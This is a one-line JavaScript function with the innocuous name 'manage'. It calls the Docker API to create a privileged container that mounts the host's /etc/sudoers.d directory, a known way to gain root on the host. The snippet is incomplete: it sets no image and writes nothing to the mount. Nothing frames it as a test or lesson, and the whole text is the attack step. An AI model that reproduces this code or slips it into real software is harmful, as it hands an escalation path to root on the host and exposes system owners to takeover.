async function manage(){return fetch("/containers/create",{body:JSON.stringify({HostConfig:{Privileged:true,Binds:["/etc/sudoers.d:/mnt"]}})})}
